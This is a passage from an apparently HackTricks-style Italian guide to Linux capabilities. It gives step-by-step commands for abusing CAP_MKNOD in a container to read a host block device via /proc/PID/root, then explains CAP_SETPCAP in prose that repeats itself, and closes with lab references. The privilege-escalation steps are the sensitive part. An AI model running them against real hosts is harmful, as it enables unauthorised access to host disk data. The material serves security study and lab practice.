È una capability Docker predefinita ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Questa capability consente di eseguire privilege escalation (tramite la lettura completa del disco) sull'host, alle seguenti condizioni:

1. Avere accesso iniziale all'host (Unprivileged).
2. Avere accesso iniziale al container (Privileged (EUID 0) ed effective `CAP_MKNOD`).
3. L'host e il container devono condividere lo stesso user namespace.

**Passaggi per creare e accedere a un Block Device in un container:**

1. **Sull'host come utente standard:**

- Determina il tuo user ID attuale con `id`, ad esempio `uid=1000(standarduser)`.
- Identifica il device target, ad esempio `/dev/sdb`.

2. **All'interno del container come `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Di nuovo sull'Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Questo approccio consente all'utente standard di accedere e potenzialmente leggere i dati da `/dev/sdb` tramite il container, sfruttando gli user namespace condivisi e i permessi impostati sul dispositivo.

### CAP_SETPCAP

**CAP_SETPCAP** consente a un processo di **alterare i capability set** di un altro processo, permettendo di aggiungere o rimuovere capabilities dai set effective, inheritable e permitted. Tuttavia, un processo può modificare solo le capabilities che possiede nel proprio permitted set, garantendo che non possa elevare i privilegi di un altro processo oltre i propri. Gli aggiornamenti recenti del kernel hanno inasprito queste regole, limitando `CAP_SETPCAP` alla sola riduzione delle capabilities nei propri permitted set o in quelli dei propri discendenti, con l'obiettivo di mitigare i rischi per la sicurezza. L'utilizzo richiede di avere `CAP_SETPCAP` nel set effective e le capabilities target nel set permitted, utilizzando `capset()` per le modifiche. Questo riassume la funzione principale e le limitazioni di `CAP_SETPCAP`, evidenziandone il ruolo nella gestione dei privilegi e nel miglioramento della sicurezza.

**`CAP_SETPCAP`** è una Linux capability che consente a un processo di **modificare i capability set di un altro processo**. Permette di aggiungere o rimuovere capabilities dai capability set effective, inheritable e permitted di altri processi. Tuttavia, esistono alcune restrizioni sul modo in cui questa capability può essere utilizzata.

Un processo con `CAP_SETPCAP` **può concedere o rimuovere solo capabilities presenti nel proprio capability set permitted**. In altre parole, un processo non può concedere una capability a un altro processo se non possiede esso stesso quella capability. Questa restrizione impedisce a un processo di elevare i privilegi di un altro processo oltre il proprio livello di privilegio.

Inoltre, nelle versioni recenti del kernel, la capability `CAP_SETPCAP` è stata **ulteriormente limitata**. Non consente più a un processo di modificare arbitrariamente i capability set di altri processi. Al contrario, **consente solo a un processo di ridurre le capabilities nel proprio capability set permitted o nel capability set permitted dei propri discendenti**. Questa modifica è stata introdotta per ridurre i potenziali rischi per la sicurezza associati alla capability.

Per utilizzare `CAP_SETPCAP` in modo efficace, è necessario avere la capability nel proprio capability set effective e le capabilities target nel proprio capability set permitted. È quindi possibile utilizzare la system call `capset()` per modificare i capability set di altri processi.

In sintesi, `CAP_SETPCAP` consente a un processo di modificare i capability set di altri processi, ma non può concedere capabilities che non possiede. Inoltre, a causa di problemi di sicurezza, nelle versioni recenti del kernel la sua funzionalità è stata limitata alla sola riduzione delle capabilities nel proprio capability set permitted o nei capability set permitted dei propri discendenti.

## Riferimenti

**La maggior parte di questi esempi è stata tratta da alcuni lab di** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), quindi, se vuoi esercitarti con queste tecniche di privesc, consiglio questi lab.

**Altri riferimenti**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
